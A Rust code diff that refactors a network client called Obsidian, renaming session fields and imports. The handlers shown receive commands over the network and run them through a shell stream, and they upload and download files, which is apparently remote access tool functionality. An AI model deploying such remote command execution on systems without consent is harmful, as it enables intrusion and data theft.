@@ -29,12 +29,11 @@ use crate::{
             response,
             upload,
             connection,
-            secure_connection
         },
         utils::{
             enums::{EncryptType, HandshakeType, Packet},
             structs::define::{EncryptionInfo, StructStone},
-            traits::define::Detector
+            traits::Detector
         }
     }
 };
@@ -57,7 +56,7 @@ impl Obsidian {
 
     pub fn secure(ip: &str) -> Obsidian {
         Obsidian {
-            session: Session::secure(ip.parse().unwrap(), secure_connection()),
+            session: Session::secure(ip.parse().unwrap()),
             exploits: ShellStream::default(),
         }
     }
@@ -72,7 +71,7 @@ impl Obsidian {
         }
     }
 
-    pub fn receiving(&mut self) -> Packet {
+    pub fn receiving(&mut self) -> &mut Packet {
         self.session.receiving(StructStone::buffer())
     }
 
@@ -120,7 +119,7 @@ impl HandleProtocols for Obsidian {
     }
 
     fn download(&mut self) -> Result<Packet> {
-        let file_arr: &[u8] = self.session.packet.take_file().unwrap().as_slice();
+        let file_arr: &[u8] = self.session.recv_packet.take_file().unwrap().as_slice();
         let mut fields: Vec<&[u8]> = file_arr.split_str("<name_end>").collect();
 
         let path = format!(
@@ -148,7 +147,7 @@ impl HandleProtocols for Obsidian {
     }
 
     fn upload(&mut self) -> Result<Packet> {
-        let path = match String::from_utf8(self.session.packet.get_file()) {
+        let path = match String::from_utf8(self.session.recv_packet.get_file()) {
             Ok(ok) => ok,
             Err(_) => return self.response("File Not Found"),
         };
@@ -168,7 +167,7 @@ impl HandleProtocols for Obsidian {
     }
 
     fn exploit(&mut self) -> Result<Packet> {
-        self.exploits.execute(self.session.packet.get_command());
+        self.exploits.execute(self.session.recv_packet.get_command());
         let output = exploit(self.exploits.get_output());
         self.set_packet(output);
         self.session.send()
